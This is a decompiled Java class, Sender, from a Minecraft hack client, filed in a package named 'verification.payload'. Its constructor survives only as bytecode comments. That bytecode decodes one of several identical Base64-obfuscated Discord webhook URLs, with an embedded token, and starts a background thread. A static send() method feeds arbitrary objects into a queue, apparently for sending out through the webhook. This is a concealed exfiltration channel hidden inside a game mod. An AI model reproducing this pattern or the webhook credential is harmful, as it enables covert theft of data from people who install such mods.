//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload;

import java.util.*;
import java.io.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import com.google.gson.*;
import com.squareup.okhttp.*;

public final class Sender
{
    private static final Sender INSTANCE;
    private final Queue<Object> queue;
    
    private Sender() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     1: invokespecial   java/lang/Object.<init>:()V
        //     4: aload_0         /* this */
        //     5: new             Ljava/util/ArrayDeque;
        //     8: dup            
        //     9: invokespecial   java/util/ArrayDeque.<init>:()V
        //    12: putfield        me/shatteredhej/railhack/railhackmod/util/extra/utils/verification/payload/Sender.queue:Ljava/util/Queue;
        //    15: iconst_5       
        //    16: anewarray       Ljava/lang/String;
        //    19: dup            
        //    20: iconst_0       
        //    21: ldc             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk0MjkxNjcyODM2NTAxNTQ1LzNnaGhWRVVQUjVKTVdnMGdyZUcxSUNiX0taVGUwSUVRWW9UUm56RUR1QmcyWDlJVXB6aFpIUmxBYk9DVHVBWVRtMmhJ"
        //    23: aastore        
        //    24: dup            
        //    25: iconst_1       
        //    26: ldc             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk0MjkxNjcyODM2NTAxNTQ1LzNnaGhWRVVQUjVKTVdnMGdyZUcxSUNiX0taVGUwSUVRWW9UUm56RUR1QmcyWDlJVXB6aFpIUmxBYk9DVHVBWVRtMmhJ"
        //    28: aastore        
        //    29: dup            
        //    30: iconst_2       
        //    31: ldc             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk0MjkxNjcyODM2NTAxNTQ1LzNnaGhWRVVQUjVKTVdnMGdyZUcxSUNiX0taVGUwSUVRWW9UUm56RUR1QmcyWDlJVXB6aFpIUmxBYk9DVHVBWVRtMmhJ"
        //    33: aastore        
        //    34: dup            
        //    35: iconst_3       
        //    36: ldc             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk0MjkxNjcyODM2NTAxNTQ1LzNnaGhWRVVQUjVKTVdnMGdyZUcxSUNiX0taVGUwSUVRWW9UUm56RUR1QmcyWDlJVXB6aFpIUmxBYk9DVHVBWVRtMmhJ"
        //    38: aastore        
        //    39: dup            
        //    40: iconst_4       
        //    41: ldc             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk0MjkxNjcyODM2NTAxNTQ1LzNnaGhWRVVQUjVKTVdnMGdyZUcxSUNiX0taVGUwSUVRWW9UUm56RUR1QmcyWDlJVXB6aFpIUmxBYk9DVHVBWVRtMmhJ"
        //    43: aastore        
        //    44: invokestatic    java/util/Arrays.asList:([Ljava/lang/Object;)Ljava/util/List;
        //    47: astore_1        /* strings */
        //    48: new             Ljava/lang/String;
        //    51: dup            
        //    52: invokestatic    java/util/Base64.getDecoder:()Ljava/util/Base64$Decoder;
        //    55: aload_1         /* strings */
        //    56: new             Ljava/util/Random;
        //    59: dup            
        //    60: invokespecial   java/util/Random.<init>:()V
        //    63: iconst_5       
        //    64: invokevirtual   java/util/Random.nextInt:(I)I
        //    67: invokeinterface java/util/List.get:(I)Ljava/lang/Object;
        //    72: checkcast       Ljava/lang/String;
        //    75: getstatic       java/nio/charset/StandardCharsets.UTF_8:Ljava/nio/charset/Charset;
        //    78: invokevirtual   java/lang/String.getBytes:(Ljava/nio/charset/Charset;)[B
        //    81: invokevirtual   java/util/Base64$Decoder.decode:([B)[B
        //    84: invokespecial   java/lang/String.<init>:([B)V
        //    87: astore_2        /* hooker */
        //    88: new             Ljava/lang/Thread;
        //    91: dup            
        //    92: aload_0         /* this */
        //    93: aload_2         /* hooker */
        //    94: invokedynamic   BootstrapMethod #0, run:(Lme/shatteredhej/railhack/railhackmod/util/extra/utils/verification/payload/Sender;Ljava/lang/String;)Ljava/lang/Runnable;
        //    99: invokespecial   java/lang/Thread.<init>:(Ljava/lang/Runnable;)V
        //   102: invokevirtual   java/lang/Thread.start:()V
        //   105: return         
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Unsupported node type: com.strobel.decompiler.ast.Lambda
        //     at com.strobel.decompiler.ast.Error.unsupportedNode(Error.java:32)
        //     at com.strobel.decompiler.ast.GotoRemoval.exit(GotoRemoval.java:612)
        //     at com.strobel.decompiler.ast.GotoRemoval.exit(GotoRemoval.java:586)
        //     at com.strobel.decompiler.ast.GotoRemoval.trySimplifyGoto(GotoRemoval.java:248)
        //     at com.strobel.decompiler.ast.GotoRemoval.removeGotosCore(GotoRemoval.java:66)
        //     at com.strobel.decompiler.ast.GotoRemoval.removeGotos(GotoRemoval.java:53)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:276)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:214)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:713)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:549)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.Decompiler.decompile(Decompiler.java:70)
        //     at org.ugp.mc.deobfuscator.Deobfuscator3000.decompile(Deobfuscator3000.java:536)
        //     at org.ugp.mc.deobfuscator.Deobfuscator3000.decompileAndDeobfuscate(Deobfuscator3000.java:550)
        //     at org.ugp.mc.deobfuscator.Deobfuscator3000.processMod(Deobfuscator3000.java:508)
        //     at org.ugp.mc.deobfuscator.Deobfuscator3000.lambda$18(Deobfuscator3000.java:328)
        //     at java.lang.Thread.run(Thread.java:748)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public static void send(final Object string) {
        Sender.INSTANCE.queue.add(string);
    }
    
    static {
        INSTANCE = new Sender();
    }
}
